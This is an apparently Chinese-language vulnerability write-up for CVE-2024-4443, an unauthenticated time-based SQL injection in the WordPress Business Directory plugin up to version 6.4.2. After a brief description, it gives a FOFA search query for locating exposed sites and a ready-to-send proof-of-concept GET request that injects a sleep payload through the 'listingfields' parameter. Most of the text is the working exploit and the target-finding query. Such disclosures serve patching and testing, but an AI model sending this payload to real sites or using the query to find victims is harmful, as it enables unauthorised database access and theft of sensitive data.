## WordPress的Business-Directory插件存在sql注入漏洞(CVE-2024-4443)

在 6.4.2 及之前的所有版本中，WordPress 的 Business Directory 插件 – Easy Listing Directorys for WordPress 插件很容易通过“listingfields”参数受到基于时间的 SQL 注入，因为对用户提供的参数转义不足且缺乏对现有 SQL 查询进行充分的准备。这使得未经身份验证的攻击者可以将额外的 SQL 查询附加到现有的查询中，这些查询可用于从数据库中提取敏感信息

## fofa

```
"/wp-content/plugins/business-directory" && icon_hash="1198047028"
```

## poc

```
GET /business-directory/?dosrch=1&q=&wpbdp_view=search&listingfields[+or+sleep(if(1=1,5,0))+))--+-][1]= HTTP/1.1
Host: 
```



![image-20240528091010272](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405280910316.png)